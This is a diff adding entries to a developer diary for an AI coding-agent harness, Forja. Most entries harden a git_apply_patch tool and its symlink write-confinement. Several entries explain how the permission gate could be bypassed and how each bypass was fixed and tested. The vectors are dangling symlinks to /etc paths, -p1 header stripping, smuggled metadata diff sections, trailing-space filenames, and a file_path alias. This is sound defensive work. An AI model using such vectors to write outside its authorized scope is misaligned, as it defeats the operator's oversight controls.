@@ -2,6 +2,1310 @@
 
 Forja progress diary. Entries in reverse chronological order (newest on top).
 
+## [2026-06-17] Symlink confinement: follow symlinked ANCESTORS in dangling targets
+
+Follow-up review finding on the dangling-symlink fix. The fix's final fallback
+only realpath'd `dirname(current)` — ONE level. So for `link → outdir/missing/
+file` where `outdir` is an in-cwd symlink to an outside/protected dir and
+`missing` is absent, `dirname(current)` (`…/outdir/missing`) also ENOENTs and the
+resolver returned the in-cwd lexical path. matchPath then allowed it while
+write_file/atomicWrite followed `outdir` and wrote OUTSIDE cwd — same escape
+class, one level deeper. Reproduced empirically (resolveSymlinks returned the
+in-cwd form; a real write landed outside). Fix: a `realpathDeepestPrefix` helper
+walks up to the deepest EXISTING component, realpaths THAT (resolving a symlinked
+ancestor at any depth), and re-appends the absent tail — replacing the one-level
+parent realpath. Terminates at the filesystem root. Shared resolveSymlinks, so
+both the matcher and the engine's resolveForProtected (which delegates to it) are
+covered. Test: the ancestor-symlink dangling target now resolves outside and
+fails matchPath; the prior dangling/in-cwd/new-file/loop cases still hold. Full
+tests/permissions green (2341).
+
+## [2026-06-17] git_apply_patch: fix false escape rejection under a symlinked cwd
+
+Review finding (reproduced + confirmed live in this very environment, where
+/home/lex/Workspaces/forja realpaths to the /run/media checkout). When the
+session cwd reaches the repo through a symlink (workspace mount, symlinked
+checkout), `getWorktreeRoot()` returns git's realpath-resolved root while the
+gated path was resolved lexically under the symlink. `relative(worktreeRoot,
+gatedAbs)` then starts with `..` and the escape guard rejected even a valid patch
+to f.txt with patch.path_mismatch — git_apply_patch was unusable from symlinked
+checkouts. Empirically: `git rev-parse --show-toplevel` from a symlinked cwd
+returns the REAL path, and the tool returned patch.path_mismatch for a clean
+patch. Fix: a `canonicalizeDir` helper realpaths the DIRECTORY of a path while
+keeping the basename literal, applied to BOTH gatedAbs and writeAbs so a symlink
+anywhere in the path (cwd, subdir, /tmp→/private/tmp on macOS) resolves
+identically and the pin/escape checks run in git's coordinate system. The literal
+basename preserves the symlink-LEAF reject (it still lstat's the link itself).
+Mirrors the engine/matcher resolveSymlinks parent-realpath fallback. Test: a
+patch applies from a symlinked cwd; the symlink-leaf reject test still passes.
+
+## [2026-06-17] git_apply_patch code-review fixes (recap tracking + deletion defense-in-depth)
+
+External review of the git_apply_patch feature. Verified each finding inline.
+
+BLOCKING — recap dropped git_apply_patch writes. `FILE_WRITER_TOOLS` (the set
+that decides which tool calls land in the recap's files-written view) listed
+only write_file/edit_file, in BOTH src/recap/projection.ts and
+src/recap/mini/deterministic.ts — each carrying the explicit "if a new
+file-writing tool ships, add it here" contract. git_apply_patch is writes:true
+and keyed by input.path (the exact shape projection.ts extracts), so every
+patched file silently vanished from writesByPath/filesChanged. Added
+'git_apply_patch' to both sets. Tests: projection now tracks a git_apply_patch
+call under filesWritten; mini filesChanged counts it.
+
+CONFIRMED + hardened — deletion rejection. classifyPatch rejects deletions by
+matching the `delete ` line in `git apply --summary`. Empirically verified all
+three deletion shapes (traditional `+++ /dev/null`, extended `deleted file
+mode`, and remove-all-lines which git also treats as a delete) emit `delete ` on
+git 2.54.0, and --numstat CANNOT corroborate (a deletion reports `0\tN\tpath`,
+identical to a line-removing edit). Since the summary text is the sole signal,
+added a version-independent defense-in-depth: capture whether the target existed
+pre-apply; if it existed before and is gone after a successful apply, the patch
+deleted it — restore from the before-image and refuse. Precise (a creation never
+trips it; a content edit always leaves the file), so no false positives.
+
+NIT (tilde divergence) — resolved as a dedup, tool-expansion deliberately left
+out. The reviewer asked to share the tilde-aware resolver. expandTilde was
+copy-pasted in THREE places (resolvers/fs.ts, resolvers/bash.ts, config.ts —
+fs/bash byte-identical, config functionally identical via slice(1) vs slice(2)):
+exactly the divergence risk this codebase keeps closing. Extracted to
+src/permissions/tilde.ts; all three import it (+ a unit test pinning the
+config.ts slice equivalence and the `~user` literal rule). The tool's gatedAbs
+still does NOT expand `~`, now with a comment explaining why: ToolContext carries
+no `home`, so a homedir/env-based expansion could DIFFER from the engine's
+injected `options.home` and let a homedir-matching gatedAbs coincide with
+writeAbs — weakening the pin. A `~` path instead resolves to a literal `<cwd>/~/…`
+that never matches the tilde-free worktree-relative writeAbs and fails the pin
+closed (git's patch paths are worktree-relative and never carry `~`, so this
+rejects nothing real). The safe expansion would need the engine's exact home
+plumbed through ToolContext — left as a follow-up, with a "do not fix with
+homedir()" guard comment so the fail-closed choice isn't naively undone.
+
+## [2026-06-17] Symlink write-confinement: close the dangling-symlink escape (engine + matcher)
+
+Two related fixes from a symlink sweep of the FS tool surface.
+
+(1) git_apply_patch — reject editing an EXISTING symlink. Editing a tracked
+symlink's blob via a content patch keeps mode 120000, so neither `git apply
+--summary` nor `--numstat` flags it (both pure patch-level), yet `git apply`
+rewrites the LINK TARGET in place (e.g. `link → ../../etc/passwd`), escaping the
+regular-files-only contract. lstat the write target before applying: a missing
+target is a classifier-proven regular-file create, an existing symlink (or any
+non-regular file) is refused. Mirrors the existing symlink-CREATE reject.
+
+(2) Engine/matcher — follow DANGLING symlinks in the protected/allow resolver.
+Root cause (confirmed empirically): `matcher.resolveSymlinks` and
+`engine.resolveForProtected` `realpathSync` the path, but on failure (the link's
+target doesn't exist) collapsed to the in-cwd lexical form. So a dangling
+`<cwd>/link → /etc/cron.d/x` resolved to `<cwd>/link` — a cwd-scoped allow rule
+matched AND the protected floor saw a safe path — while the KERNEL still followed
+the link on write (write_file → atomicWrite deliberately writes through dangling
+links, a tested feature). A single write_file through such a link landed outside
+cwd / inside a protected zone. Realistic vector: a dangling symlink shipped in an
+untrusted checked-out repo (write_file/git_apply_patch can't create symlinks; bash
+`ln -s` is analyzer-gated). Fix: when realpath fails, READ the link (lstat +
+readlink) and follow the stored target (chains, bounded at 40 hops), exactly as
+the bash resolver already does, then resolve its parent. The two resolvers are
+now UNIFIED — `resolveForProtected` delegates to the exported `resolveSymlinks`,
+so the protected floor and the allow matcher canonicalize identically (the
+divergence between them was itself a latent leak). A dangling link whose target
+stays in-cwd still matches (legit write-through preserved); only escaping links
+fall out. Sole live FS vector was write_file (edit_file/read_file bail on the
+dangling read; existing-target symlinks were already caught). Tests: dangling→
+outside no-match + resolves to real target, dangling→protected resolves to the
+protected path, dangling→in-cwd (abs + relative) still matches, symlink cycle
+bounded, new-regular-file/existing-outside/symlinked-parent regressions held.
+Full tests/permissions green (2334), write-file (16), git_apply_patch (17).
+
+## [2026-06-17] git_apply_patch: delegate patch parsing to git (eliminate the divergence class)
+
+A 6th parser bug — a valid single-file diff whose hunk ENDS with content lines
+that render as `--- a/X`/`+++ b/X` (file content `-- a/X` → `++ b/X`) was
+falsely rejected as multi-file (positional header detection can't tell a trailing
+content pair from a real header). Root cause across all 6: the hand-rolled diff
+parser kept diverging from what `git apply` actually does. Fix is architectural,
+not another patch: STOP re-parsing the diff; ask git.
+
+`parseSingleFilePatch` (and src/diff/git-patch.ts) is removed. The tool now
+classifies the patch via git itself, with the SAME `--recount` it applies with:
+- `git apply --summary --recount` → structural ops. Reject `delete ` (covers
+  both `delete mode …` and traditional `delete f`), `rename `, `copy `, `mode
+  change`. Creation is allowed.
+- `git apply --numstat -z --recount` → the file set + write target. 0 → malformed;
+  >1 → multi-file; `-`/`-` counts → binary; the one entry's path is git's EXACT
+  write target (already -p1-stripped, whitespace-preserved), which the pin
+  compares against the gated path. (Both probes are pure patch-level — verified
+  they don't read the worktree — so context-mismatch still surfaces via --check,
+  not as a parse error.)
+
+This SUBSUMES every prior hand-rolled fix (−p1 normalization, filename
+whitespace, metadata-only sections, multi-file count, binary, deletion) because
+git is now the single source of truth for what the patch touches — the parser
+cannot diverge from the applier (same binary, same flag). Net: the divergence
+class is closed; the finding's patch now applies; +2 git probes per call.
+Tests: the trailing-content-pair patch applies; multi-file (diff --git)/binary/
+deletion/rename/mode/metadata-section/path-mismatch/-p1/whitespace all reject;
+context-mismatch + --recount preserved. ~1114 scoped tests green.
+
+REVIEW HARDENING (2 finders, verified inline; confinement confirmed — no bypass):
+(A) result counts now come from numstat (git's truth), not lineDiff — a
+newline-only change reported 0/0 before (lineDiff strips the trailing newline);
+(B) runGitApply drains stdout/stderr BEFORE writing stdin (deadlock-safe pattern,
+output is small today but the order is now correct); (C) skip whitespace-only
+numstat entries (robust against a trailing-newline trailer); (D) reject symlink
+(`create mode 120000`) / submodule (`160000`) creates — write_file can't make
+those and a symlink at the gated path could set up a later write-through; regular
+creates (100644/100755) stay allowed. Tests added for regular create + symlink
+reject. Full tools suite green (640).
+
+Systematic sweep (3 parallel adversarial finders: permissions/sandbox · harness/
+hooks · tui/cli/audit) for every surface keyed on tool name/category where
+git_apply_patch was missing vs how write_file/edit_file are handled. Verified
+each candidate inline. Two REAL gaps fixed:
+- Hook `if:` path filter (hooks/dispatcher-matching.ts): the fs-path-extraction
+  list was write_file/edit_file/read_file only, so an `if: git_apply_patch(*.ts)`
+  filter fell to fail-open and ignored the path glob. Added git_apply_patch.
+- Batch headline verb (tui/state.ts): no case → headless batches read "Applied
+  patch ×N"; added `Applied N patches`.
+
+Refuted (not gaps, verified): grant-relevance switch is section-keyed (resolves
+to write_file); TOOL_CAPABILITY_FOOTPRINTS is PolicyToolsSection-keyed (inherits
+write_file's footprint); escapesCwd/hadBash is for out-of-worktree effects (git
+apply's write is an in-scope, checkpoint-reversible worktree write — same as
+write_file); ergonomics/constraints prompts intentionally don't promote patch
+(it's the niche per the eval). Shared-section design (no separate
+tools.git_apply_patch policy/render/template) is correct by design.
+
+SANDBOX (finder flagged "critical", verified NOT): git_apply_patch spawns `git
+apply` without consuming ctx.sandboxProfile — but write_file/edit_file IGNORE it
+too (the planner emits a profile by capability, so all fs.write tools get one
+and none bwrap-wrap; only bash consumes it). fs.write tools confine via the
+permission GATE (authorized path + the tool's header==gated path-pin), not
+bwrap. So git_apply_patch is consistent. The one genuine distinction — git apply
+is an EXTERNAL binary vs write_file's in-process write — makes bwrap-confining it
+a reasonable defense-in-depth backstop, but it's optional, sizable, and would be
+inconsistent to do for git_apply_patch alone; deferred.
+
+A subagent playbook can whitelist git_apply_patch and declare
+`tool_restrictions.git_apply_patch.allow_paths`, but restrictions.ts wired path
+extractors only for write_file/edit_file/read_file/grep/git — and
+`checkRestriction` returns ok for any tool with no extractor. So the declared
+path fence was silently ignored: the child could patch any path the PARENT
+policy allowed, not the playbook's narrower list. Fix: add git_apply_patch to
+both `TOOL_RESTRICTION_SHAPE` ('path') and `TOOL_RESTRICTION_EXTRACTORS`.
+
+While wiring it, closed a related latent gap: the extractor read only `args.path`,
+but the file-class tools resolve `file_path > path` (pathArgOf / the engine's
+filePathOf), so a child sending `{file_path:…}` would slip past the fence on a
+field the tool still honors. Added `FILE_PATH_EXTRACTOR` (file_path > path) for
+write_file / edit_file / read_file / git_apply_patch; grep/git stay on the
+path-only extractor (the engine gates THEM on `args.path` only, never the alias).
+Purely additive-protective — `path`-using callers are unchanged, it only closes
+the file_path bypass. Tests: git_apply_patch fenced by allow_paths (inside ok,
+outside refused) + the file_path-alias variant refused. Full subagents suite
+green (677).
+
+## [2026-06-16] sec(git_apply_patch): reject deletion patches (delete-fs under-declared)
+
+The parser accepted deletion patches (`+++ /dev/null`) and git apply removed the
+file, but the resolver only ever declared write-fs/read-fs — never delete-fs.
+`delete-fs` is a first-class, distinguished capability (risk-score.ts weights it
+alongside git-write/env-mutate; engine.ts has a delete-fs floor case; bash `rm`
+emits deleteFs per path), so a deletion via git_apply_patch removed an allowed
+write target while escaping the delete-fs floor/risk that governs every other
+removal. Fix: reject deletion patches outright (new `deletion` reject reason →
+patch.unsupported, with a hint to delete via the shell `rm`, which the engine
+gates correctly). Chosen over threading delete-fs through the resolver: deletion
+is out of this tool's "edit/create content" scope, it's a destructive op better
+left to the properly-gated `rm`, and rejecting keeps the tool from performing an
+operation it can't accurately declare. Create (`--- /dev/null`) stays — that's a
+write, correctly declared write-fs. Tests: parser rejects deletion; tool
+integration leaves the file in place.
+
+## [2026-06-16] sec(git_apply_patch): preserve filename whitespace when pinning (confinement bypass)
+
+Third confinement bypass, same class as the -p1 one: `headerPath` did `.trim()`
+on the parsed name, but git preserves leading/trailing spaces in filenames.
+Verified on git 2.54: `--- a/foo ` applies to the file `foo ` (trailing space),
+not `foo` — with both present, git wrote `foo ` and left `foo` untouched. So a
+call gated for `path:'foo'` could modify/create the sibling `foo ` that the
+engine never checked. Fix: drop the `.trim()`; strip only syntax git also strips
+— the `\t<timestamp>` suffix and a trailing CR (CRLF line ending) — never
+filename spaces. The normalized path now equals git's write target, so the pin
+holds. Tests: parser keeps the trailing space; tool integration proves a gated
+`foo` cannot touch `foo ` (patchPathMismatch, sibling untouched).
+
+## [2026-06-16] sec(git_apply_patch): normalize header paths exactly as git apply -p1 (confinement bypass)
+
+Second confinement bypass: the parser only stripped `a/`/`b/`, but the tool runs
+`git apply` with the default `-p1`, which strips the FIRST path component
+regardless. So a TRADITIONAL header without the prefix — `--- src/f.txt` —
+returned `src/f.txt` here and passed the pin against a gated `src/f.txt`, while
+`git apply -p1` stripped `src/` and wrote repo-root `f.txt` (leaving the gated
+file untouched). Reproduced: a patch naming `src/f.txt` edited root `f.txt`,
+which the engine never gated. Fix: a header path is valid only as `/dev/null`
+or with the `a/`/`b/` prefix (the canonical git-diff form, where stripping the
+prefix reproduces git's -p1 write target exactly); any other form → `bad_header`
+reject. Prefix-less / traditional `diff -u` headers are refused (the model is
+told to emit git-diff format anyway). Fail-closed: the normalized path now
+equals what git will write, so the pin can't be fooled. Tests: parser rejects a
+prefix-less header; tool integration proves the root file git -p1 would have hit
+stays untouched.
+
+## [2026-06-16] sec(git_apply_patch): reject metadata-only diff sections (confinement bypass)
+
+Found + fixed a real confinement bypass in the single-file check. The parser
+counted only `---`/`+++` header pairs, but a `diff --git` section can carry ONLY
+metadata — a chmod (`old mode`/`new mode`) or an empty create/delete (`new file
+mode`/`deleted file mode` with no hunk) — which has NO header pair. So a patch
+with one authorized content hunk for the gated `path` could append a second
+`diff --git a/other b/other` metadata section: header-pair count stayed 1 (passed
+the single-file check) while `git apply --recount` happily applied the second
+section, letting `git_apply_patch({path:'allowed'})` create/chmod/delete a path
+the permission engine never gated. Reproduced: an appended `new file mode`
+section created a brand-new file. Fix: (1) reject `old mode`/`new mode` (chmod is
+not a content edit); (2) require every `diff --git` line to be the canonical
+header for the one edited file (`diff --git a/<path> b/<path>`) — any other
+section (different path, or an unparseable/quoted name) is refused. Fail-closed;
+the gated file is the only thing git can touch. Tests: parser rejects the
+appended-metadata and chmod shapes + accepts the matching git-format header; tool
+integration proves the out-of-scope path is NOT created and the gated file is
+untouched.
+
+## [2026-06-16] tools: git_apply_patch — single-file, git-backed patch apply
+
+New builtin write tool: applies a single-file unified diff via `git apply`. Git
+is the proven applier (context matching, fuzz, whitespace); Forja owns the
+policy/safety layer around it. **Single-file by design** — this sidesteps the
+permission engine's one-path-per-tool model entirely (the tool takes an explicit
+`path` arg, so the engine gates exactly one path with ZERO engine rewrite), and
+it dissolves the `patch.partial_apply` failure mode that motivated the spec
+deferral (one file via `git apply` is atomic — all hunks or none). The display
+diff reuses `lineDiff(before, after)` so the card (line-number gutter, +N/-M,
+colors) is identical to write_file/edit_file. Gated as the `write_file` policy
+section (shared via FS_TOOL_TRAITS) and auto-checkpointed like any fs.write, so
+reversibility holds.
+
+Guard: refuses early with `git.missing` (no git binary) or `git.not_a_repo`
+(outside a worktree), both hinting at edit_file/write_file as the git-free
+fallback. Validation rejects multi-file / rename / copy / binary / mode-only
+patches and any header path that escapes the worktree or mismatches `path`.
+
+SPEC NOTE: `CONTRACTS.md §2.6.8.A` marks `apply_patch` **deferred → v2**. This
+diverges deliberately and conservatively — single-file (not the spec's
+multi-file `patches[]`), name `git_apply_patch`, git-backed. It satisfies the
+spec's own reopen trigger ("user reports a concrete pattern where edit_file
+fails" — exact-match brittleness on drifting/whitespace-inconsistent context)
+and removes the partial-apply objection. A spec-PR to flip the deferral and
+record the single-file/git decision is pending the operator's explicit ok (no
+docs/spec edits made without it).
+
+WIRING (non-obvious): a single-path FS tool needs TWO registrations to behave —
+`FS_TOOL_TRAITS[git_apply_patch] = { section: 'write_file' }` (so the policy
+lookup uses the write_file allow/deny lists) AND a capability resolver in
+resolvers/fs.ts (write-fs + read-fs on the path). Without the resolver the engine
+forces a conservative `confirm` ("no resolver registered"), so the trait alone is
+not enough. Reuses `getGitBinaryWithEnv` (pinned absolute git, controlled PATH)
+and `isGitRepo`/`getWorktreeRoot`; no sandbox-wrap (matches write_file — the gate
++ the header-path == gated-path pin confine the write to one authorized file).
+Tests: parser unit (11), tool integration (8: apply+diff, not-repo, context
+mismatch leaves file untouched, multi-file/path-escape/path-mismatch rejects,
+invalid-arg, abort), engine section-sharing. Green: lint + typecheck + impacted
+suites (diff/tools/permissions/cli/tui ~379).
+
+REVIEW HARDENING (3 finder angles, verified inline; no security escape found —
+fail-closed throughout): (1) `runGitApply` now has a 30s timeout + ctx.signal
+kill (was unbounded — a wedged git would hang the turn, the gap vs runGit); (2)
+parser detects file headers POSITIONALLY (consecutive `---`/`+++` followed by
+`@@`/`diff`/EOF) so a removed `-- x` (→`--- x`) or added `++ x` (→`+++ x`)
+content line is no longer miscounted as a second file → false multi_file; (3)
+path-mismatch error now shows both resolved paths + a cwd-not-root note (the tool
+reconciles cleanly when cwd is the repo root; the header is worktree-root-
+relative); (4) resolver-registration now test-covered (accidental removal →
+silent confirm-fallback otherwise); (5) `TOOL_NOUN['git_apply_patch']='patches'`.
+Refuted: symlink-TOCTOU (out-of-model concurrent-attacker race, shared by all
+write tools), absolute/`../` paths (caught by the pin + git), `@@`-loose
+detection. Green after fixes: typecheck + lint + 1126 tests across the 6 suites.
+
+EDIT-FORMAT POSITIONING: reframed git_apply_patch from "apply a pre-made diff"
+to a diff-shaped ALTERNATIVE edit format to edit_file's {old,new} pairs. Both
+git apply calls now pass `--recount` so git recomputes the `@@` hunk counts from
+the body — the model only needs correct context lines, not correct header
+arithmetic (the historical apply_patch fragility). Descriptions updated both
+ways (git_apply_patch ↔ edit_file pointer); edit_file stays the stated default.
+Whether patch should become the PRIMARY edit format is an eval question, not a
+call: added `evals/edit-format/` (4 tasks × 2 steered cases — single-line,
+multi-hunk, repeated-lines, nested-indent) measuring first-try edit success-rate
+per format per model, plus an `eval:edit-format` script. Test: --recount applies
+a patch with deliberately-wrong `@@` counts.
+
+EVAL VALIDITY FIX + first result. The first run looked like git_apply_patch 2/4,
+but that was a broken harness: the eval cwd (`~/.cache/forja-eval`) is not a git
+repo, so git_apply_patch always returned git.not_a_repo and the "passes" were
+edit_file fallback (the old `tool_called` only checks the tool was INVOKED, not
+that it succeeded). Fixed the framework: added `setup.gitInit` (types + loader +
+executor `git init`s the cwd) and added `tool_not_called` on the sibling edit
+tools to every case so a pass means the steered tool ALONE made the edit. Valid
+re-run, BOTH target models: **opus 8/8 and gpt-5.4 8/8 — edit_file 4/4 AND
+git_apply_patch 4/4 on each**. So the formats are equally reliable on the strong
+models; patch's earlier "weakness" was entirely the env bug, and --recount +
+single-file make it a co-equal alternative, not a liability. (gpt was slower —
+multi-hunk patch 43s/6 steps via the Responses path — but cheaper overall.)
+Caveats: single run each (non-deterministic), 4 easy-ish tasks — directional, not
+conclusive; a differentiator would need harder tasks (big files, many hunks,
+tricky whitespace) or weaker models (mini/haiku). No edit-success reason to flip
+primary, so edit_file stays the default (no git dep, simpler/auditable) and
+git_apply_patch the niche. Loader test added for `gitInit`.
+
+## [2026-06-16] tui: line-number gutter on the write/edit diff snippet
+
+The diff card showed `+N/-N` counts and a colored snippet but no positions — the
+operator saw WHAT changed, not WHERE. `lineDiff` already walks both files via
+LCS, so it knew the indices; now it stamps each `DiffLine` with `oldLine` /
+`newLine` (1-based; `del` carries old only, `add` new only, `ctx` both). Numbers
+are absolute (threaded through `diffOps`, not snippet-relative) and survive the
+block-replace fallback path. The renderer adds a right-aligned line-number
+gutter — `newLine ?? oldLine`, so surviving/added lines show new-file numbers and
+deletions show old-file — with the `│` rail (`|` in ASCII). The number takes the
+line's own tone (add green / del red / ctx dim) so it reads as part of the change;
+only the rail stays `secondary` (grey) as a neutral divider. The `+N -M` counts
+also moved OFF the head onto the file-path line (right after the path they
+describe), keeping the head a clean `verb [Xms]`. The content width cap
+shrinks by the gutter so a numbered line is never longer than the unnumbered one
+was. Gutter is suppressed (width 0) when no line carries a number, so hand-built
+diffs / older fixtures render exactly as before — the existing render tests pass
+untouched. write/edit tools and the harness→TUI plumbing are unchanged (only the
+optional fields were added). Tests: line numbers for replace/insert/delete +
+absolute-position deep in a file (line-diff); gutter render new-vs-old, right-
+alignment to the widest number, `│` rail under unicode, no-gutter back-compat
+(permanent). Scoped suites green (line-diff + permanent 119, tools + adapter
+149); typecheck + lint clean. UI-first — validate via `bun run dev`. Follow-up
+left open: intra-line (word-level) highlight of the changed span on modified
+lines; multiple hunks instead of only the first changed region.
+
+## [2026-06-16] tui: footer `N% context used` chip (>= 97% only)
+
+Wired the long-anticipated context-occupancy chip into the footer's right
+cluster, as the TRAILING segment (after cost). The data model was already in
+place and maintained — `status.contextWindow` (banner-seeded),
+`status.lastTurnContextTokens` (input + cache of the latest turn = what occupied
+the window when the model generated), and `status.contextStale` (set on
+compaction, cleared by the next turn with real usage); the field comments even
+said "the footer suppresses the %", but no chip rendered it. Now it does:
+`{pct}% context used` painted `error` (red — the strongest passive footer
+signal, since the window is about to overflow), shown ONLY at >= 97% — a late
+near-the-ceiling warning that compaction/overflow is imminent; below that it's
+noise. Suppressed pre-boot
+(contextWindow 0), before the first measured turn (lastTurnContextTokens 0), and
+while stale (post-compaction, pre-remeasure) so we never show an estimated or
+outdated figure. `Math.floor` + clamp to 100 so the number never overstates or
+exceeds 100%. Tests: surfaces at >=97%, trailing position after cost, suppressed
+below 97% / stale / pre-boot, 100% clamp, warn color. Footer suite green (65).
+UI-first — validate via `bun run dev`; the 97% threshold is a literal const,
+trivially tunable if the warning lands too late.
+
+## [2026-06-16] fix(tui/openai): harden the reasoning block (review follow-ups)
+
+A `/code-review` (xhigh) over the two uncommitted reasoning changes surfaced a
+blocker-class issue plus several mediums, all fixed here before commit:
+
+- **Sanitize reasoning on entry (blocker).** `harness-adapter.ts` passed
+  `thinking_delta` text RAW while `text_delta` right above it stripped ANSI —
+  reasoning is model output too and can carry DEC private modes (alt-screen,
+  hide-cursor) that hijack the terminal once painted to the live chip /
+  scrollback `reasoning:` block. Now `stripAnsi`'d on entry, same single-point
+  invariant as `text_delta`.
+- **Textless delta no longer injects `"undefined"`.** `thinking:delta.text` is
+  optional on the event contract; the reducer concatenated it unguarded
+  (`buffer + undefined` → literal `"undefined"`). Now `?? ''`.
+- **Flush trims before capping** so leading/trailing whitespace can't persist as
+  empty grey rows; the guard already keyed off `.trim()`.
+- **`capReasoning` no longer splits a surrogate pair** at the 1500-char cut
+  (would render U+FFFD); drops a lone trailing high surrogate.
+- **Reasoning body soft-wraps** to the frame inner width (`wrap-ansi`, `hard`) —
+  an OpenAI summary is often one long paragraph that would overflow `cols` and
+  break the 2sp margin. Blank part-separators survive the wrap.
+- **OpenAI multi-part/multi-step summaries get a blank-line separator.** The
+  normalizer only handled `reasoning_summary_text.delta`; consecutive summary
+  parts (and reasoning items across tool round-trips) ran together. Now
+  `reasoning_summary_part.added` injects `\n\n` at each boundary after the first.
+
+Tests: adapter ANSI-strip on thinking_delta; reducer textless-delta + trim-flush;
+capReasoning surrogate boundary; the reasoning render case (was untested) for
+content/colors/wrap/blank-separators; stream multi-part separator. Scoped suites
+green (TUI state+render 294, adapter 96, openai 55+); typecheck + lint clean.
+Known-deferred: Anthropic thinking is suppressed on tool-bearing turns (no
+signature round-trip unless reasoning-replay, default off), so Claude's block
+only populates on no-tool turns — pre-existing, not this change.
+
+## [2026-06-16] openai: stream the reasoning summary as thinking_delta
+
+Empirically confirmed (gpt-5.4): the reasoning scrollback block stayed empty for
+OpenAI. Reasoning EFFORT was enabled (`reasoning.effort` on the Responses path)
+so the model reasoned, but the adapter (a) requested no summary and (b) captured
+the reasoning output item OPAQUELY (`kind: 'reasoning'`, encrypted, for replay) —
+never as `thinking_delta`. OpenAI never exposes the raw chain-of-thought, but it
+WILL stream a SUMMARY when asked. Two changes: `responses.ts` now sends
+`reasoning: { effort, summary: 'auto' }` (gated on the same supports_reasoning_effort
+as effort — the gpt-5.x reasoning models that support summaries), and
+`responses-stream.ts` maps `response.reasoning_summary_text.delta` →
+`thinking_delta`. That feeds the existing pipeline: live "Thinking…" chip AND the
+new scrollback `reasoning:` block now populate for gpt (with a summary, vs
+Anthropic's full extended thinking). Tests: stream normalizer surfaces summary
+deltas as thinking_delta (answer still flows as text_delta); the Responses params
+assertion now pins `summary: 'auto'`. OpenAI suite green (55). NOT verified
+against the live API — `summary: 'auto'` is broadly available for gpt-5.x but the
+real proof is a live run; `'detailed'` can need org verification, hence `'auto'`.
+
+## [2026-06-16] tui: persist the reasoning block to scrollback
+
+Providers return reasoning (Anthropic extended-thinking emits `thinking_delta`
+text; OpenAI is often opaque/summary), but the TUI only showed a live
+"Thinking…" spinner and the reducer EXPLICITLY discarded the delta text
+("Delta events don't change state"). Now the deltas accumulate (LiveState.thinking
+gains a `text` buffer) and `thinking:end` flushes a scrollback `reasoning` block:
+a `reasoning:` label and body both in the secondary (grey meta) channel — it's
+the model's scratch work, not the answer, so the whole block recedes; the label
+is just BOLD (bold + secondary stacked) to anchor it. Capped
+at flush (`capReasoning`, 1500 chars + "… (reasoning truncated)") so an
+extended-thinking turn doesn't bury the conversation in grey; empty/whitespace
+reasoning (e.g. opaque OpenAI turns) flushes nothing. The live spinner is
+unchanged; this adds the persisted block on close. New `reasoning` PermanentItem
++ render case; `bold` was already an SGR token. Tests: accumulate→flush,
+empty→nothing, capReasoning. Updated 6 pre-existing thinking-state fixtures for
+the new required `text` field. Full TUI suite green (1035). UI-first — validate
+via `bun run dev`; tunable cap / opt-out left for follow-up if the default
+volume is wrong.
+
+## [2026-06-16] fix(permissions): empty-string fs path is "omitted", not a deny
+
+Observed in a real session: a `git` call with `path: ''` was DENIED with
+"missing or non-string path argument", forcing the model to retry with `.`. Root
+cause is a tool↔engine inconsistency for the rootArg tools (grep/glob/git): the
+TOOLS treat an empty path as OMITTED (repo-wide — git.ts/grep.ts say so, and
+models often emit `''`), but the engine's `resolveFsTarget` mapped only
+`undefined` → cwd, while `''` fell through to `isNonEmptyString('') === false`
+→ null → deny. So a repo-wide `git status` with `path: ''` was blocked even
+though the identical call with the arg absent passed and the tool would have run
+repo-wide either way. Fixed `resolveFsTarget` to treat `''` like `undefined`
+(→ cwd) for rootArg tools. NOT a security loosening: empty path = repo-wide =
+exactly what an absent arg already resolves to (cwd, an already-classified
+scope); a genuinely non-string value (number/array/null) still returns null →
+deny. Regression test: `git` with `path: ''` resolves to cwd and passes under a
+read_file allow. Full permissions suite green (2328).
+
+## [2026-06-16] tui: vocab for the 8 chip-less builtins + self-maintaining coverage
+
+Asking how a skill appears in the TUI surfaced the same gap as working_state_update,
+but wider: EIGHT registered builtins had no `TOOL_VOCAB` entry and rendered the
+awkward `Called <name>` fallback (no subject) — `skill_invoke` / `skill_show` /
+`skill_list`, `reminder` / `reminder_cancel` / `reminder_list`,
+`retrieve_context`, and `bash_list`. So invoking `review-diff` showed only
+`Called skill_invoke` — not even WHICH skill. Added vocab for all eight with a
+subject that surfaces the salient arg (skill `name` → `Invoked skill ·
+review-diff`; `retrieve_context` query; `reminder` note; `reminder_cancel` id;
+`bash_list` / `skill_list` status/scope). Root cause of why this kept hiding:
+the vocab-coverage test enumerated a HAND-MAINTAINED `builtins` array that
+drifted from the registry (it was also missing working_state_update). Replaced
+it with a derivation from the authoritative `BUILTIN_TOOLS` export — a new
+builtin without a vocab entry now fails the test automatically, no list to keep
+in sync. Added a skill-subject test. Full TUI suite green (1032). Pure vocab data
++ test; no render change.
+
+## [2026-06-16] tui: render the working-state panel on update
+
+`working_state_update` had no `TOOL_VOCAB` entry, so it rendered the generic
+fallback chip `Called working_state_update` — visible noise with zero info about
+what changed — while the panel itself (focus/next/hypotheses) went only to the
+model's prompt (the `working_state_updated` event was a TUI no-op). Made the
+chip `silent` and turned that event into the operator-facing feedback: the
+adapter formats `event.state` (which the event already carries) into a compact
+`info` block — header `Updated working state` + focus + next + open hypotheses,
+a SNAPSHOT of the current state, NOT the log (history; would bloat scrollback on
+every update). Two-tone: the `Updated working state` header renders in the
+DEFAULT tone (visible label) while the body recedes in the `secondary` (grey
+meta) channel — operational scaffolding, not primary content. The split rides a
+new optional `header` field on the `info` item/event (header always default,
+message in the item's tone); `formatWorkingStatePanel` returns `{ header, body }`. A new `formatWorkingStatePanel` (render/working-state.ts)
+one-line-sanitizes each model-authored field (no ANSI/control injection, no
+fabricated rows) and returns null when nothing operational is set (empty /
+log-only / cleared → renders nothing). Generalized the `info` render in
+permanent.ts to be multi-line-safe (one framed line per `\n`; single-line
+unchanged). The chip is `silent` but `revealFailure: true`: a REJECTED update
+fires no success event, so without it an error would vanish — now it surfaces a
+failure chip with the reason. Also added `working_state_update` to the
+vocab-coverage test's builtins list (it was missing — which is why the absent
+entry went uncaught). Tests: formatter (render/skip/sanitize), vocab
+(silent+revealFailure), adapter (event→info, empty→nothing), info multi-line.
+Full TUI suite green (1031). UI-first per the iterate-before-spec convention —
+validate via `bun run dev`; UI.md / WORKING_STATE.md §4.4 sync is a follow-up.
+
+## [2026-06-16] fix(security): escalate-on-write floor follows XDG too
+
+Closed the related gap the previous entry left open. The foreign-deny fix made
+the DENY floor XDG-aware, but `tildeEscalateDirs` (escalate-on-write for Forja's
+own config/data dirs) still resolved home-relative only. Re-examined under
